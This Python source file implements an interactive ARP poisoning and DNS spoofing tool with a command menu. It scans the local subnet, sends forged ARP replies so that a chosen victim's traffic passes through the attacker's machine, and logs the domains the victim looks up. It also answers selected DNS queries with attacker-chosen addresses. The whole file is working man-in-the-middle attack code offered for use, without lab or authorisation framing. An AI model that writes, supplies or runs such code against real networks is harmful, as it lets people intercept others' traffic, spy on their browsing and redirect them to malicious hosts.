"""
    ARP Poisoning and DNS Spoofer

    Includes interactive shell and scripts for ARP poisoning
        and DNS spoofing
"""
import socket
import time
import threading
from binascii import hexlify
import netifaces
from networking import ARPFrame, DNSHeader, DNSQuery, DNSResponse, EthernetFrameHeader, IPHeader, UDPHeader

# Constants
BROADCAST_MAC = bytes([255 for i in range(6)])

# Variables
interface = None
arp_socket = None
route_socket = None
local_ip = None
local_mac = None
local_mask = None
local_gateway = None
local_gateway_mac = None
local_broadcast = None
attack_ip = None
attack_mac = None
network = {} # IP -> MAC
dns_spoofs = {} # DOMAIN -> IP


# Utility functions

def print_header():
    print("#"*30)
    print("\tARP Poisoner")
    print("\t-Devon")
    print("#"*30)

def get_default_gateway_ip():
    """
        Return the default gateway IP for the given interface
            or False if none found
    """
    global interface

    for gateway in netifaces.gateways()[netifaces.AF_INET]:
        if (gateway[1] == interface and gateway[2]):
            return gateway[0]
    return False

def bytes_to_hex_str(hex):
    """
        Take a bytes object and convert to a
            hex string
    """
    return str(hexlify(hex))[2:-1].upper()

def print_network_info():
    """
        Print scanned network information to console
    """

    print("IP\t\tMAC")
    print("\n".join([f"{ip}\t{bytes_to_hex_str(mac)}" for ip,mac in network.items()]))

# Main functions

def on_intercept_packet(to_gateway, ip_header, payload):
    """
        Packet intercept function, used to hook events on packet receive
        
        Params:
            to_gateway - Boolean - Whether the packet is going to gateway, if not, going to victim
            ip_header - IPHeader - IPHeader object for packet
            payload - Bytes - The rest of the packet
        
        Returns:
            Bool - Whether to forward the packet or not
    """
    global route_socket
    global attack_ip
    global attack_mac
    global local_gateway
    global local_gateway_mac
    global dns_spoofs

    ip_protocol = ip_header.protocol

    #print(ip_protocol)
    if (ip_protocol == 17):
        # UDP packet, can decode
        udp_header = UDPHeader.from_raw_data(payload[:UDPHeader.LENGTH])

        if (to_gateway and udp_header.dest_port == 53):
            # Intercepting a DNS query
            dns_header = DNSHeader._from_raw_data(payload[UDPHeader.LENGTH: UDPHeader.LENGTH + DNSHeader.LENGTH])
            if (dns_header.flags.operation == 0):
                # This is a DNS Query
                dns_payload = payload[UDPHeader.LENGTH + DNSHeader.LENGTH:]
                (domains, qtype, qclass) = DNSQuery.decode_payload(dns_header.question_count, 
                    dns_payload)
                domain = domains[0]

                print(f"Target viewed {domain}")

                if (domain in dns_spoofs.keys()):
                    # We send a spoofed packet back
                    dns_packet = DNSResponse(local_gateway, attack_ip, udp_header.src_port, 
                    dns_header.identification, dns_payload, [dns_spoofs[domain]], qtype, ttl=60)
                    ether_frame = EthernetFrameHeader(local_gateway_mac, attack_mac, 2048)

                    route_socket.send(ether_frame.pack() + dns_packet.pack())
                    print(f"Spoofed {domain} as {dns_spoofs[domain]}")
                    return False # Don't forward the query

    return True


def poison(ip):
    """
        Begin the process of an ARP poisoning attack
            on the supplied IP address
    """
    global network
    global arp_socket
    global route_socket
    global local_mac
    global local_ip
    global local_gateway
    global local_gateway_mac
    global attack_mac
    global attack_ip

    attack_ip = ip
    attack_mac = network[attack_ip]
    local_gateway_mac = network[local_gateway]

    def _poison():
        while 1:
            # Spoof being the gateway to the victim
            frame = ARPFrame(2, local_mac, local_gateway, 
            attack_mac, attack_ip)
            arp_socket.send(frame.pack())

            # Spoof being the victim to the gateway
            frame = ARPFrame(2, local_mac, attack_ip, local_gateway_mac, local_gateway)
            arp_socket.send(frame.pack())
            time.sleep(0.5)

    def _forward():
        while 1:
            try:
                data, address = route_socket.recvfrom(65535)
            except:
                continue

            eth_header = EthernetFrameHeader.from_raw_data(data[:14]) # 14 bytes to ethernet header
            if (eth_header.ethertype != 2048):
                    continue # Not an IP packet, ignore this transmission
            
            header_length = (data[14] & 15) * 4 # data[14] is 1st byte of IPv4 Header
                                                    # of which is the last 4 bits are the header size   
            ip_header_end = 14 + header_length  # End of IP header      
            ip_header = IPHeader.from_raw_data(data[14:ip_header_end])

            dest_ip = socket.inet_ntoa(ip_header.dest_ip)
            src_ip = socket.inet_ntoa(ip_header.src_ip)
            to_gateway = False

            if (src_ip == attack_ip):
                eth_header.dest_mac = local_gateway_mac # Replace destination mac to gateway
                to_gateway = True
            elif (dest_ip == attack_ip):
                eth_header.dest_mac = attack_mac # Replace destination mac to victim mac
                to_gateway = False
            else:
                continue # Ignore this packet

            forward = on_intercept_packet(to_gateway, ip_header, data[ip_header_end:])
            
            if (not forward):
                continue # Don't forward this packet

            # Commit change to destination mac
            data = eth_header.pack() + data[14:]
            # Forward data
            try:
                route_socket.send(data)
            except:
                continue

    poison_thread = threading.Thread(target=_poison, daemon=True)
    forward_thread = threading.Thread(target=_forward, daemon=True)
    poison_thread.start()
    forward_thread.start()

    print(f"Poison on {attack_ip} initiated")

def scan_network(mask):
    """
        Perform a scan of the network and
            update the network table
        
        Params:
            mask - String - Subnet mask, e.g. 255.255.255.0
    """
    global network
    global local_ip
    global local_broadcast
    global arp_socket
    global route_socket

    network = {}
    finish_scan = False

    def _listen():
        while 1:
            if (finish_scan):
                break
            
            try:
                data, address = route_socket.recvfrom(1024)
            except:
                continue

            eth_header = EthernetFrameHeader.from_raw_data(data[:14])
            
            if (eth_header.ethertype != 2054):
                continue # Not an ARP frame

            header = data[14:42] # Isolate ARP header, excluding ETH header & any excess data
            ARP_frame = ARPFrame.from_raw_data(header)

            if (ARP_frame.operation != 2):
                continue # This is not a reply
            
            network[socket.inet_ntoa(ARP_frame.spa)] = ARP_frame.sha


    listening_thread = threading.Thread(target=_listen, daemon=True)
    listening_thread.start()

    time.sleep(1) # Wait for listening to startup

    # Generate IPs to scan using mask
    ip_int = int.from_bytes(socket.inet_aton(local_ip), "big")
    mask_int = int.from_bytes(socket.inet_aton(mask), "big")
    ip_root = ip_int & mask_int # Grab the root of the IP subnet by ANDing the mask and ip
    rest_of_ips = (1 << 32) - 1 - mask_int # Grab the rest of IP bits as an int
    
    for i in range(rest_of_ips):
        target_ip = socket.inet_ntoa((ip_root + i).to_bytes(4, "big"))

        ARP_request = ARPFrame(1, local_mac, local_ip, BROADCAST_MAC, target_ip)
        arp_socket.send(ARP_request.pack())

        time.sleep(0.01)
        print(f"Scanned {i}/{rest_of_ips} hosts", end="\r")

    time.sleep(1)
    finish_scan = True

    print("Scan found the following hosts on network:")
    print_network_info()


def init():
    """
        Initialisation of sockets and
            program variables
    """
    global interface
    global arp_socket
    global route_socket
    global local_mac
    global local_ip
    global local_gateway
    global local_broadcast
    global local_mask

    arp_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    route_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))

    arp_socket.bind((interface, 0))
    route_socket.bind((interface, 0))
    route_socket.settimeout(1)

    interface_data = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
    local_mac = arp_socket.getsockname()[4]
    local_ip = interface_data["addr"]
    local_gateway = get_default_gateway_ip()
    local_broadcast = interface_data["broadcast"]
    local_mask = interface_data["netmask"]


def menu():
    """
        Menu for the execution of the utility
    """
    global local_mac
    global local_ip
    global local_gateway
    global local_mask
    global network
    global dns_spoofs
    
    print("\n"*100) # Clear Terminal clutter
    print_header()
    print(f"Local IP:   {local_ip}\tLocal MAC: {bytes_to_hex_str(local_mac)}")
    print(f"Gateway IP: {local_gateway}\tMask: {local_mask}")
    print("(help for help)\n")

    while 1:
        argv = input(">").split(" ")
        argc = len(argv)

        if argv[0] == "help":
            print("Command\t\t\tNotes")
            print("scan <mask>\t\tScans the local network. Mask is optional, allows CIDR or subnet notation")
            print("poison <ip>\t\tPerforms an ARP poison on the specified IP address")
            print("spoofdns <domain> <ip>\tSpoof DNS response for domain to given IP")
            print("network\t\t\tShow scanned network details")
            print("quit\t\t\tQuits the application")

        elif argv[0] == "scan":
            if argc == 1:
                mask = local_mask
            else:
                mask = argv[1]
            
            try:
                mask = int(mask)
            except:
                # Take mask to be in subnet format
                pass
            else:
                # Mask is in CIDR format, convert mask to subnet format
                mask = socket.inet_ntoa(int("1"*mask + "0"*(32-mask), 2).to_bytes(4, "big"))

            scan_network(mask)

        elif argv[0] == "poison":
            if argc != 2:
                print("Invalid use: poison <ip>")
                continue
            ip = argv[1]
            if (ip not in network.keys()):
                print("Unknown IP. Scan hosts with `scan` command.")
                continue
            poison(ip)

        elif argv[0] == "spoofdns":
            if argc != 3:
                print("Invalid use: spoofdns <domain> <ip>")
                continue
            domain = argv[1]
            ip = argv[2]
            dns_spoofs[domain] = ip
            print(f"Spoofing {domain} as {ip}")

        elif argv[0] == "network":
            print_network_info()

        elif argv[0] == "quit":
            break
        
        else:
            print("Unrecognised command. Use `help` for command list.")

    
def main():
    """
        Entry-function for execution of
            the utility
    """
    global interface

    print_header()

    while interface == None:
        print("Please select your network interface:")
        print("\n".join([f"{i}. {name}" for i,name in enumerate(netifaces.interfaces())]))
        try:
            number = int(input("> "))
            interface = netifaces.interfaces()[number]
        except ValueError:
            print("Error: Please select the number corresponding to your interface")
        except:
            print("Error: Not an applicable selection")
        else:
            print(f"Selected {interface}")
    
    init()
    menu()


if __name__ == "__main__":
    main()



